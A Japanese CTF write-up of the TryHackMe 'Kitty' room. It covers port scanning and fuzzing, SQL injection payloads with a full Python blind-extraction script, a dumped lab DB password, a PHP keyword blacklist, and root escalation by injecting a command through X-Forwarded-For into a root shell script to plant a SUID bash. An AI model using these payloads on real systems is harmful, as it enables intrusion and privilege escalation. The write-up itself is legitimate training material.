# Kitty CTF

https://tryhackme.com/room/kitty

## Enumeration

```shell
TARGET=10.201.90.232
sudo bash -c "echo $TARGET   kitty.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, HTTP

### ディレクトリ列挙

dirsearch で config.php などを発見。

```sh
[04:35:14] 200 -    1B  - /config.php
[04:35:26] 200 -  512B  - /index.php/login/
[04:35:31] 302 -    0B  - /logout.php  ->  index.php
[04:35:44] 200 -  564B  - /register.php
```

## HTTP

ユーザー登録できる。ログイン、ログアウト、別のユーザーを作ってログインしても、PHPSESSID は変わらず `t4ic0s1fnma6j8pjobipfbucgf` で固定。

register.php, index.php について sqlmap を実行したが何も出なかった。

### パラメータファジング

config.php のパラメータファジングしたが何も出なかった。

```sh
ffuf -u 'http://kitty.thm/config.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -fs 1
```

POST

```sh
ffuf -u 'http://kitty.thm/config.php' -X POST -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -d 'FUZZ=1' -fs 1
```

welcome.php のパラメータも出ない。

```sh
ffuf -u 'http://kitty.thm/welcome.php?FUZZ=1' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -H 'Cookie: PHPSESSID=t4ic0s1fnma6j8pjobipfbucgf' -fr 'in development'
```

PHPSESSID のファジングも失敗。

```sh
ffuf -u 'http://kitty.thm/welcome.php' -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -H 'Cookie: PHPSESSID=FUZZ' -fs 0
```

### ログインパスワードブルートフォース

kitty, admin についてブルートフォースを試みたが失敗。

### 再びSQLi

ユーザー名に下記指定すると、`SQL Injection detected. This incident will be logged!` と表示された。

```
kitty' or 1=1-- -
```

and にすると、welcome.php に転送される。末尾は `-- -` にしないと成功しないので、MySQLと判断できる。また、ユーザー名を `noexist` とするとログイン失敗になるので kitty ユーザーは存在する。

```
kitty' and 1=1-- -
```

下記でログインできる。

```
noexist' union select 1,2,3,4-- -
```

続いてスキーマを調べたいが、ほぼほぼ攻撃を検出されて失敗する。そもそもSELECTの結果が画面表示されないので、blind-based の手法が必要。

```
no' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata-- -
```

下記の手法を繰り返すことでDB名を特定することが可能。

```sh
# ログイン成功
a' UNION SELECT 1,2,3,4 where database() like '%';-- -

# ログイン失敗したらaで始まるDB名はない
a' UNION SELECT 1,2,3,4 where database() like 'a%';-- -
```

スクリプトでDB名が判明。

```python
#!/usr/bin/env python3
# enum_dbname_with_logout.py
# Blind DB name enumeration by checking HTTP status (302 == match)
# After each probe request, perform GET /logout.php on the same host.

import requests
import time
import sys
from urllib.parse import urljoin
from requests.exceptions import RequestException

# === Configuration ===
TARGET_URL = "http://kitty.thm/index.php"   # POST endpoint (full URL)
COOKIE_VALUE = "t4ic0s1fnma6j8pjobipfbucgf" # set your PHPSESSID here
PASSWORD = "aaa"                            # form's password value
USERNAME_PREFIX = "a' UNION SELECT 1,2,3,4 WHERE database() LIKE '{pattern}';-- -"
# pattern is inserted including trailing % (e.g. 'adm%')

# Character set to try (order matters — put most likely first)
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-ABCDEFGHIJKLMNOPQRSTUVWXYZ"

SLEEP_BETWEEN = 0.3   # seconds between requests (be nice / avoid WAF rate limits)
MAX_DBNAME_LEN = 40    # safety cap
LOGOUT_PATH = "/logout.php"  # relative path to call after each probe
ALLOW_REDIRECTS_FOR_LOGOUT = True  # whether to follow redirects on logout GET

# === End configuration ===

HEADERS = {
    "User-Agent": "Mozilla/5.0 (enum-dbname-script)",
    "Content-Type": "application/x-www-form-urlencoded",
}

session = requests.Session()
session.headers.update(HEADERS)
session.cookies.set("PHPSESSID", COOKIE_VALUE)

# compute logout URL from target URL
def logout_url_from_target(target, logout_path):
    # If logout_path is full URL, urljoin will keep it; if relative, it will join to target's base.
    base = target
    # ensure base ends with slash for proper join if necessary
    return urljoin(base, logout_path)

LOGOUT_URL = logout_url_from_target(TARGET_URL, LOGOUT_PATH)

def send_probe(pattern):
    """
    Send a single POST with the username payload where {pattern} already contains the trailing % if needed.
    Returns True if response indicates a match (302), False otherwise.
    Always tries to call logout after the probe (best-effort).
    Retries a few times on network error.
    """
    data = {
        "username": USERNAME_PREFIX.format(pattern=pattern),
        "password": PASSWORD
    }
    tries = 3
    for attempt in range(tries):
        try:
            # do not allow requests to automatically follow redirects so we can observe 302 directly
            resp = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=10)
            is_match = (resp.status_code == 302)
            # Optionally, if you want to ensure Location contains 'welcome.php':
            # is_match = (resp.status_code == 302 and 'welcome.php' in resp.headers.get('Location',''))

            # After probe, perform logout GET (best-effort). We don't want logout failures to stop enumeration.
            try:
                logout_resp = session.get(LOGOUT_URL, allow_redirects=ALLOW_REDIRECTS_FOR_LOGOUT, timeout=10)
                # Debug:
                # print(f"[DEBUG] logout status={logout_resp.status_code} len={len(logout_resp.text)}")
            except RequestException as e:
                print(f"[!] Logout GET failed (ignored): {e}", file=sys.stderr)

            return is_match
        except RequestException as e:
            print(f"[!] Network error on attempt {attempt+1}: {e}", file=sys.stderr)
            time.sleep(1)
    raise RuntimeError("Network failure: all retries failed")

def enumerate_dbname():
    dbname = ""
    pos = 1
    print("[*] Starting blind DB name enumeration (will call logout after each probe)")
    print(f"[*] Target POST: {TARGET_URL}")
    print(f"[*] Logout URL: {LOGOUT_URL}")
    while pos <= MAX_DBNAME_LEN:
        found_char = None
        for ch in CHARSET:
            test_pattern = f"{dbname + ch}%"
            try:
                print(test_pattern)
                match = send_probe(test_pattern)
            except RuntimeError as e:
                print("[!] Aborting due to network errors.", file=sys.stderr)
                return dbname
            if match:
                dbname += ch
                found_char = ch
                print(f"[+] Found char #{pos}: '{ch}' -> dbname so far: '{dbname}'")
                time.sleep(SLEEP_BETWEEN)
                break
            else:
                # no match for this char, continue trying charset
                time.sleep(SLEEP_BETWEEN)
        if not found_char:
            # no character in CHARSET matched at this position -> assume end of name
            print("[*] No char found at position", pos, "- assuming end of DB name.")
            break
        pos += 1
    print("[*] Enumeration finished. DB name:", repr(dbname))
    return dbname

if __name__ == "__main__":
    try:
        name = enumerate_dbname()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
```

続いて、テーブル名、列名、内部データを順番にダンプする。

最初に入手したパスワードは全部大文字だったためSSH接続できなかった。`WHERE BINARY` のような書き方が必要。

## 権限昇格

config.php のパスワードを使ってDBに接続した。development用のDBを発見したが、入っていた認証情報はスクリプトで入手したものと同じだった。

```sh
kitty@ip-10-201-112-145:/var/www/html$ cat ./config.php 
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'kitty');
define('DB_PASSWORD', 'Sup3rAwesOm3Cat!');
define('DB_NAME', 'mywebsite');

/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

// Check connection
if($mysqli === false){
        die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>
```

シェルファイルを発見。

```sh
kitty@ip-10-201-112-145:/var/www$ cat /opt/log_checker.sh 
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

/development の index.php には、/var/www/development/logged にIPアドレスを出力するコードが入っている。/html の index.php にはない。  
X-FORWARDED-FOR を操作すれば、コマンドインジェクションが成立しそうだが、問題は /development の方のindex.php をトリガーする方法。

```sh
kitty@ip-10-201-112-145:/var/www/development$ cat ./index.php 
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: welcome.php");
    exit;
}

include('config.php');
$username = $_POST['username'];
$password = $_POST['password'];
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
        if (preg_match( $evilword, $username )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        } elseif (preg_match( $evilword, $password )) {
                echo 'SQL Injection detected. This incident will be logged!';
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                $ip .= "\n";
                file_put_contents("/var/www/development/logged", $ip);
                die();
        }
}
```

local向けに 8080 ポートをリッスンしていることを確認。

```sh
tcp              LISTEN            0                 70                                                            127.0.0.1:33060                                  0.0.0.0:*                                                              
tcp              LISTEN            0                 128                                                             0.0.0.0:22                                     0.0.0.0:*                                                              
tcp              LISTEN            0                 4096                                                      127.0.0.53%lo:53                                     0.0.0.0:*                                                              
tcp              LISTEN            0                 151                                                           127.0.0.1:3306                                   0.0.0.0:*                                                              
tcp              LISTEN            0                 511                                                           127.0.0.1:8080                                   0.0.0.0:*                                                              
tcp              LISTEN            0                 128                                                                [::]:22                                        [::]:*                                                              
tcp              LISTEN            0                 511                                                                   *:80                                           *:*  
```

8080 ポートにリクエストし、development のページが返ってくることを確認。

8080ポートのトンネリング。

```sh
ssh -L 8080:localhost:8080 kitty@10.201.112.145
```

`127.0.0.1;/home/kitty/cpbash.sh` のような X-Forwarded-For を設定し、SQLインジェクションを検出させる。

SUID付きbashのコピーに成功。

```sh
kitty@ip-10-201-112-145:/var/www/development$ ls -al /home/kitty
total 1196
drwxr-xr-x 4 kitty kitty    4096 Nov  9 01:57 .
drwxr-xr-x 4 root  root     4096 Nov  9 00:13 ..
-rwsr-sr-x 1 root  root  1183448 Nov  9 01:57 bash
lrwxrwxrwx 1 root  root        9 Nov 15  2022 .bash_history -> /dev/null
-rw-r--r-- 1 kitty kitty     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kitty kitty    3771 Feb 25  2020 .bashrc
drwx------ 2 kitty kitty    4096 Nov  8  2022 .cache
-rwxrwxr-x 1 kitty kitty      62 Nov  9 01:51 cpbash.sh
-rw------- 1 kitty kitty     220 Nov  9 01:17 .mysql_history
-rw-r--r-- 1 kitty kitty     807 Feb 25  2020 .profile
drwx------ 2 kitty kitty    4096 Nov  8  2022 .ssh
-rw-r--r-- 1 kitty kitty       0 Nov  8  2022 .sudo_as_admin_successful
-rw-r--r-- 1 root  root       38 Nov 15  2022 user.txt
```

昇格成功。

```sh
kitty@ip-10-201-112-145:/var/www/development$ /home/kitty/bash -p
bash-5.0# id
uid=1000(kitty) gid=1000(kitty) euid=0(root) egid=0(root) groups=0(root),1000(kitty)
```

## 振り返り

- 今回のような単純なSQLインジェクションをsqlmapで検出できない場合があるということが、大きな学び。
- なぜ検出できなかったのかについて、[ChrisPritchard氏の記事](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-rooms/kitty.md)で非常によく調査されている。ブラックリストフィルターを回避するため、多くの改ざんスクリプトを使う必要がある。
- blind-SQLi 等でパスワードを列挙するとき、BINARY を使って大文字小文字を区別することを学んだ。
